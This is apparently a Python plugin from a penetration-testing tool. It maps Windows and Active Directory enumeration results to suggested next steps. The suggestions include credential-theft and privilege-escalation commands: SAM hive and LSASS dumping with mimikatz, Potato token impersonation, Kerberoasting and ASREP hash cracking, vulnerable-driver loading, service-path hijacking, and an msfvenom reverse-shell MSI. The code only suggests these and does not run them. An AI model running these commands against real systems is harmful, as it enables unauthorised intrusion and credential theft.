"""Suggester plugin: turns enumeration signals into passive recommendations.

It consumes the results of other plugins (never re-enumerates) and never
executes the commands it suggests. ``suggest`` builds the signals once and hands
them to every rule in a fixed order; each rule is a pure function of the signals.
"""

from __future__ import annotations

from typing import Dict, List, Optional

from kitsune.context import (
    CONFIDENCE_HIGH,
    CONFIDENCE_LOW,
    CONFIDENCE_MEDIUM,
    RunContext,
)
from kitsune.engine import Plugin
from kitsune.model import (
    KIND_ENUMERATION,
    KIND_EXPLOIT,
    KIND_HINT,
    CheckResult,
    Report,
    Suggestion,
    as_asreproast_payload,
    as_protocol_payload,
    service_paths_of,
    stdout_lines_of,
)


# --------------------------------------------------------------------------
# signals
# --------------------------------------------------------------------------


class Signals:
    def __init__(self) -> None:
        self.privileges: List[str] = []       # lowercased whoami /priv lines
        self.service_paths: List[str] = []
        self.spn_lines: List[str] = []
        self.always_install: List[str] = []   # lowercased
        self.asrep_hashes: int = 0
        self.secrets_found: int = 0
        self.failure_reasons: List[tuple] = []  # (check_id, code)
        self.credential_works_map: Dict[str, bool] = {}

    @staticmethod
    def from_checks(checks: List[CheckResult]) -> "Signals":
        s = Signals()
        for check in checks:
            proto_payload = as_protocol_payload(check.data)
            if proto_payload is not None:
                if check.check_id.startswith("sweep."):
                    proto = check.check_id[len("sweep."):]
                    s.credential_works_map[proto] = bool(proto_payload["credential_works"])
                for f in proto_payload["findings"]:
                    if isinstance(f, dict) and f.get("failure_reason") is not None:
                        s.failure_reasons.append((check.check_id, f["failure_reason"]))
            asrep = as_asreproast_payload(check.data)
            if asrep is not None:
                s.asrep_hashes = len(asrep["asrep_hashes"])
            cid = check.check_id
            if cid == "sysenum.privileges":
                s.privileges = [line.lower() for line in stdout_lines_of(check.data)]
            elif cid == "sysenum.services":
                s.service_paths = service_paths_of(check.data)
            elif cid == "sysenum.always_install_elevated":
                s.always_install = [line.lower() for line in stdout_lines_of(check.data)]
            elif cid == "sweep.spn":
                s.spn_lines = stdout_lines_of(check.data)
            elif cid == "secret_hunter.findings":
                s.secrets_found = len(check.findings)
        return s

    def privilege_enabled(self, name: str) -> bool:
        needle = name.lower()
        return any(
            needle in line and "enabled" in line and "disabled" not in line
            for line in self.privileges
        )

    def credential_works(self, protocol: str) -> bool:
        return self.credential_works_map.get(protocol, False)


# --------------------------------------------------------------------------
# privilege rules
# --------------------------------------------------------------------------


def r_sebackup(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeBackupPrivilege"):
        return None
    return Suggestion(
        "sug.sebackup_privilege",
        "SeBackupPrivilege present — dump SAM/SYSTEM/SECURITY",
        KIND_EXPLOIT,
        "SeBackupPrivilege lets you read any file. Exfiltrate the credential hives and recover the local admin hash.",
        [
            "reg save HKLM\\SAM sam.hiv",
            "reg save HKLM\\SYSTEM system.hiv",
            "reg save HKLM\\SECURITY security.hiv",
            "impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL",
        ],
        CONFIDENCE_HIGH,
        ["sysenum.privileges"],
    )


def r_impersonate(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeImpersonatePrivilege"):
        return None
    return Suggestion(
        "sug.seimpersonate_privilege",
        "SeImpersonatePrivilege present — token impersonation",
        KIND_EXPLOIT,
        "SeImpersonatePrivilege (with a spawned/pipe token) is the classic Potato prerequisite. Confirm you are not already SYSTEM, then try a potato variant.",
        [
            "whoami /priv",
            'whoami /groups | findstr /i "S-1-5-32-544"',
            'GodPotato -cmd "cmd /c whoami"',
            "JuicyPotato.exe -t * -p cmd.exe -l 1337",
        ],
        CONFIDENCE_MEDIUM,
        ["sysenum.privileges"],
    )


def r_assign_token(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeAssignPrimaryTokenPrivilege"):
        return None
    return Suggestion(
        "sug.seassignprimarytoken",
        "SeAssignPrimaryTokenPrivilege present — token theft",
        KIND_EXPLOIT,
        "SeAssignPrimaryTokenPrivilege enables the same Potato family as SeImpersonate, and token theft against a higher-privileged process.",
        [
            'GodPotato -cmd "cmd /c whoami"',
            "impacket-secretsdump -dc-ip <DC> <domain>/<user>",
        ],
        CONFIDENCE_MEDIUM,
        ["sysenum.privileges"],
    )


def r_debug(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeDebugPrivilege"):
        return None
    return Suggestion(
        "sug.sedebug_privilege",
        "SeDebugPrivilege present — dump LSASS",
        KIND_EXPLOIT,
        "SeDebugPrivilege lets you open LSASS and dump credentials of logged-in users.",
        [
            "procdump.exe -ma -accepteula lsass.exe lsass.dmp",
            'mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit',
        ],
        CONFIDENCE_HIGH,
        ["sysenum.privileges"],
    )


def r_restore(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeRestorePrivilege"):
        return None
    return Suggestion(
        "sug.serestore_privilege",
        "SeRestorePrivilege present — write to SYSTEM paths",
        KIND_EXPLOIT,
        "SeRestorePrivilege lets you drop files into SYSTEM-owned locations, e.g. hijack a service binary or plant a DLL for a later service start.",
        ["icacls <target> /grant Everyone:F", "sc qc <service>"],
        CONFIDENCE_MEDIUM,
        ["sysenum.privileges"],
    )


def r_load_driver(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeLoadDriverPrivilege"):
        return None
    return Suggestion(
        "sug.seloaddriver_privilege",
        "SeLoadDriverPrivilege present — vulnerable driver",
        KIND_EXPLOIT,
        "SeLoadDriverPrivilege allows loading a signed-but-vulnerable driver (Capcom, RTCore, etc.) to escalate to kernel privileges.",
        [
            "sc create vuln binPath= C:\\temp\\capcom.sys type= kernel",
            "sc start vuln",
        ],
        CONFIDENCE_MEDIUM,
        ["sysenum.privileges"],
    )


def r_take_ownership(s: Signals) -> Optional[Suggestion]:
    if not s.privilege_enabled("SeTakeOwnershipPrivilege"):
        return None
    return Suggestion(
        "sug.setakeownership_privilege",
        "SeTakeOwnershipPrivilege present — take ownership of protected files",
        KIND_EXPLOIT,
        "SeTakeOwnershipPrivilege lets you take ownership of files you cannot read, then grant yourself access.",
        ["takeown /f <path> /r", "icacls <path> /grant <user>:F"],
        CONFIDENCE_MEDIUM,
        ["sysenum.privileges"],
    )


# --------------------------------------------------------------------------
# service rules
# --------------------------------------------------------------------------


def _is_unquoted(path: str) -> bool:
    t = path.strip()
    if " " not in t or ".exe" not in t.lower():
        return False
    if "\\" not in t and not t.startswith("C:"):
        return False
    return not t.startswith('"')


def r_unquoted_service(s: Signals) -> Optional[Suggestion]:
    paths = [p for p in s.service_paths if _is_unquoted(p)]
    if not paths:
        return None
    return Suggestion(
        "sug.unquoted_service_path",
        "Unquoted service path(s) found",
        KIND_EXPLOIT,
        "A service binary path with a space and no quotes lets you plant a same-prefix executable that the service resolves first.",
        [
            f"sc qc <service>  # e.g. {paths[0]}",
            'copy evil.exe "C:\\Program Files\\Vuln.exe"',
        ],
        CONFIDENCE_LOW,
        ["sysenum.services"],
    )


# --------------------------------------------------------------------------
# AD / sweep rules
# --------------------------------------------------------------------------


def r_spn(s: Signals) -> Optional[Suggestion]:
    if not s.spn_lines:
        return None
    return Suggestion(
        "sug.kerberoast",
        "Service principal names found — Kerberoast",
        KIND_EXPLOIT,
        "A service account has an SPN. Request its TGS ticket and crack it offline to recover a domain credential.",
        [
            "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request",
            "hashcat -m 13100 spns.txt rockyou.txt",
        ],
        CONFIDENCE_HIGH,
        ["sweep.spn"],
    )


def r_smb_works(s: Signals) -> Optional[Suggestion]:
    if not s.credential_works("smb"):
        return None
    return Suggestion(
        "sug.smb_credential_valid",
        "Credential works over SMB — enumerate shares and sessions",
        KIND_ENUMERATION,
        "The credential authenticates over SMB. Enumerate shares, sessions and group membership; if the account is a domain admin, DCSync is on the table.",
        [
            "nxc smb <host> -u <user> -p <pass> --shares",
            "nxc smb <host> -u <user> -p <pass> --sessions",
            "nxc smb <host> -u <user> -p <pass> --users --groups",
        ],
        CONFIDENCE_HIGH,
        ["sweep.smb"],
    )


def r_winrm_works(s: Signals) -> Optional[Suggestion]:
    if not s.credential_works("winrm"):
        return None
    return Suggestion(
        "sug.winrm_credential_valid",
        "Credential works over WinRM — interactive shell",
        KIND_ENUMERATION,
        "The credential authenticates over WinRM. Open a shell and continue enumeration on the host.",
        [
            "evil-winrm -i <host> -u <user> -p <pass>",
            "nxc winrm <host> -u <user> -p <pass> -x whoami",
        ],
        CONFIDENCE_HIGH,
        ["sweep.winrm"],
    )


def r_mssql_works(s: Signals) -> Optional[Suggestion]:
    if not s.credential_works("mssql"):
        return None
    return Suggestion(
        "sug.mssql_credential_valid",
        "Credential works over MSSQL — check for sysadmin",
        KIND_ENUMERATION,
        "The credential authenticates to MSSQL. Enumerate linked servers and, if it is sysadmin, command execution is a single step away.",
        [
            "nxc mssql <host> -u <user> -p <pass> -q \"SELECT IS_SRVROLEMEMBER('sysadmin')\"",
            "nxc mssql <host> -u <user> -p <pass> -q \"EXEC xp_cmdshell 'whoami'\"",
        ],
        CONFIDENCE_HIGH,
        ["sweep.mssql"],
    )


def r_asreproast(s: Signals) -> Optional[Suggestion]:
    if s.asrep_hashes == 0:
        return None
    return Suggestion(
        "sug.asreproast",
        "ASREPRoastable accounts found — crack the hashes",
        KIND_EXPLOIT,
        "Accounts with Kerberos pre-auth disabled yield ASREP hashes. Crack them offline to recover their password.",
        ["hashcat -m 18200 asrep.txt rockyou.txt"],
        CONFIDENCE_HIGH,
        ["sweep.asreproast"],
    )


def r_always_install_elevated(s: Signals) -> Optional[Suggestion]:
    if not any("alwaysinstallelevated" in line and "0x1" in line for line in s.always_install):
        return None
    return Suggestion(
        "sug.always_install_elevated",
        "AlwaysInstallElevated enabled — MSI privilege escalation",
        KIND_EXPLOIT,
        "AlwaysInstallElevated is set to 1, so any MSI installs as SYSTEM. Build a payload MSI (msfvenom) and install it.",
        [
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o payload.msi",
            "msiexec /quiet /qn /i payload.msi",
        ],
        CONFIDENCE_HIGH,
        ["sysenum.always_install_elevated"],
    )


def r_chain_credential_path(s: Signals) -> Optional[Suggestion]:
    if not s.credential_works("smb"):
        return None
    return Suggestion(
        "sug.chain.credential_path",
        "Suggested path from a valid SMB credential",
        KIND_HINT,
        "Ordered next steps once a credential works over SMB.",
        [
            "1. nxc smb <host> -u <user> -p <pass> --shares --sessions",
            "2. nxc ldap <host> -u <user> -p <pass> --laps --asreproast --trusted-for-delegation",
            "3. if the account is a domain admin: impacket-secretsdump -dc-ip <DC> <domain>/<user>:<pass>",
        ],
        CONFIDENCE_MEDIUM,
        ["sweep.smb"],
    )


# --------------------------------------------------------------------------
# failure rules
# --------------------------------------------------------------------------


def _evidence_for(s: Signals, codes: List[str]) -> Optional[str]:
    for check_id, reason in s.failure_reasons:
        if reason in codes:
            return check_id
    return None


def _clock_skew_evidence(s: Signals) -> Optional[str]:
    for check_id, reason in s.failure_reasons:
        if reason.startswith("KRB_AP_ERR_") or reason == "clock skew":
            return check_id
    return None


def r_password_must_change(s: Signals) -> Optional[Suggestion]:
    ev = _evidence_for(s, ["STATUS_PASSWORD_MUST_CHANGE", "STATUS_PASSWORD_EXPIRED"])
    if ev is None:
        return None
    return Suggestion(
        "sug.password_must_change",
        "Password expired or must change — set a new one and retry",
        KIND_HINT,
        "The credential is correct but the account owes a password change. Change it once and retest: this is not a lockout risk and the old password is now dead for every other host.",
        [
            "smbpasswd -r <host> -U <user>",
            "rpcclient -U <user> <host> -c \"setuserinfo2 <user> 23 'NewPass!23'\"",
        ],
        CONFIDENCE_HIGH,
        [ev],
    )


def r_account_disabled(s: Signals) -> Optional[Suggestion]:
    ev = _evidence_for(s, ["STATUS_ACCOUNT_DISABLED"])
    if ev is None:
        return None
    return Suggestion(
        "sug.account_disabled",
        "Account disabled — find who can re-enable it",
        KIND_HINT,
        "The password is irrelevant: the account is switched off. Spraying it further changes nothing — enumerate the accounts that can re-enable it, or pivot to a credential that is not disabled.",
        [
            'nxc ldap <host> -u <user> -p <pass> --query "(userAccountControl:1.2.840.113556.1.4.803:=2)"',
        ],
        CONFIDENCE_MEDIUM,
        [ev],
    )


def r_account_locked_out(s: Signals) -> Optional[Suggestion]:
    ev = _evidence_for(s, ["STATUS_ACCOUNT_LOCKED_OUT"])
    if ev is None:
        return None
    return Suggestion(
        "sug.account_locked_out",
        "Account locked out — wait out the policy, do not spray",
        KIND_HINT,
        "The lockout threshold has already been hit. Further attempts extend the window and may trip the domain-wide policies; read the policy, wait it out, and use a single known-good attempt.",
        ["nxc smb <host> -u <user> -p <pass> --pass-pol"],
        CONFIDENCE_MEDIUM,
        [ev],
    )


def r_clock_skew(s: Signals) -> Optional[Suggestion]:
    ev = _clock_skew_evidence(s)
    if ev is None:
        return None
    return Suggestion(
        "sug.clock_skew",
        "Clock skew against the DC — synchronise before requesting tickets",
        KIND_HINT,
        "Kerberos rejects a ticket request when the attacker's clock differs from the DC's by more than the allowed skew, and the failure looks like a bad credential. Sync the clock (or run the tools under faketime set to the DC's time) and repeat the ticket request before concluding anything about the password. `kitsune sweep --fix-time` does this automatically: it probes the DC clock and wraps the wrappers with faketime.",
        [
            "kitsune sweep --target <dc> -u <user> -p <pass> --fix-time --spn --asreproast",
            "kitsune sweep --target <dc> -u <user> -p <pass> --faketime '+<skew>h' --kerberoast",
            "faketime -f '+<skew>s' impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request",
        ],
        CONFIDENCE_HIGH,
        [ev],
    )


def r_logon_type_denied(s: Signals) -> Optional[Suggestion]:
    ev = _evidence_for(s, ["STATUS_LOGON_TYPE_NOT_GRANTED"])
    if ev is None:
        return None
    return Suggestion(
        "sug.logon_type_denied",
        "Logon type not granted — try another protocol",
        KIND_ENUMERATION,
        "The credential is valid but this account may not log on this way (`Deny log on through…`, or a service account that is SMB-only). The same credential over another protocol is a different right, so try the others before discarding it.",
        [
            "nxc winrm <host> -u <user> -p <pass>",
            "nxc smb <host> -u <user> -p <pass>",
            "nxc mssql <host> -u <user> -p <pass>",
        ],
        CONFIDENCE_MEDIUM,
        [ev],
    )


def r_secrets_found(s: Signals) -> Optional[Suggestion]:
    if s.secrets_found == 0:
        return None
    return Suggestion(
        "sug.try_found_secrets",
        "Candidate secrets found — test them against services",
        KIND_HINT,
        "The secret hunter found candidate credentials. Try them against SMB/WinRM/RDP before discarding them.",
        [
            "nxc smb <host> -u <user> -p <candidate>",
            "evil-winrm -i <host> -u <user> -p <candidate>",
        ],
        CONFIDENCE_LOW,
        ["secret_hunter.findings"],
    )


_RULES = [
    r_sebackup,
    r_impersonate,
    r_assign_token,
    r_debug,
    r_restore,
    r_load_driver,
    r_take_ownership,
    r_unquoted_service,
    r_spn,
    r_smb_works,
    r_winrm_works,
    r_mssql_works,
    r_asreproast,
    r_always_install_elevated,
    r_chain_credential_path,
    r_password_must_change,
    r_account_disabled,
    r_account_locked_out,
    r_clock_skew,
    r_logon_type_denied,
    r_secrets_found,
]


def suggest(checks: List[CheckResult]) -> List[Suggestion]:
    """Run every rule over the collected checks and return the sorted
    suggestions."""
    signals = Signals.from_checks(checks)
    out: List[Suggestion] = []
    for rule in _RULES:
        suggestion = rule(signals)
        if suggestion is not None:
            out.append(suggestion)
    out.sort(key=lambda s: s.id)
    return out


class Suggester(Plugin):
    meta = (
        "suggester",
        "Passive suggestion engine",
        "Maps enumeration signals to recommended next steps (enumeration, exploit, hint). Never executes them.",
    )

    def __init__(self, prior: List[CheckResult]) -> None:
        self.prior = prior

    @staticmethod
    def from_report_json(text: str) -> "Suggester":
        import json

        report = Report.from_dict(json.loads(text))
        return Suggester(report.checks)

    def run(self, ctx: RunContext) -> List[CheckResult]:
        suggestions = suggest(self.prior)
        check = CheckResult.success(
            "suggester.recommendations",
            "suggester",
            "Recommended next steps",
            {"suggestion_count": len(suggestions)},
        )
        check.with_suggestions(suggestions)
        return [check]
